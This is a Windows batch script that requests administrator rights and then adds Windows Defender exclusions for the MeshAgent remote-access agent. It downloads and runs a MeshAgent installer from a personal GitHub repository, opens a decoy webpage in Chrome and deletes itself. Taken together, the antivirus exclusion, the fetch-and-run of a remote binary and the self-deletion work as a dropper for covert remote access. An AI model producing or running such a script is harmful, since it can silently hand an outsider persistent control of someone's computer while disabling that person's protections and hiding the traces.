@echo off
setlocal

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------

powershell -NoProfile -ExecutionPolicy Bypass -Command "& {
    Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\Mesh Agent\MeshAgent.exe';
    Add-MpPreference -ExclusionPath 'C:\Users\gamej\Downloads\meshagent32-Main.exe';
    Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\Mesh Agent';
    Add-MpPreference -ExclusionProcess 'MeshAgent.exe';
    Write-Host 'MeshAgent has been added to Windows Defender exclusions.';
    Pause
}"

:: Define variables
set "URL=https://github.com/eastoncrafter/eastoncrafter.github.io/raw/refs/heads/main/meshagent64-Main.exe"
set "FILENAME=meshagent64-Main.exe"
set "DEST=%TEMP%\%FILENAME%"
set "WEBPAGE=https://example.com"

:: Download the file using PowerShell
echo Downloading %FILENAME%...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%', '%DEST%')"

:: Check if the file was downloaded
if exist "%DEST%" (
    echo Running installer...
    "%DEST%" -fullinstall
) else (
    echo Download failed!
    exit /b
)

:: Open the link in Chrome
echo Opening webpage...
start chrome "%WEBPAGE%"

:: Delete this script
echo Deleting script...
(
    echo @echo off
    echo del /f /q "%~f0"
) > "%TEMP%\delete_me.bat"
start /b cmd /c "%TEMP%\delete_me.bat"

exit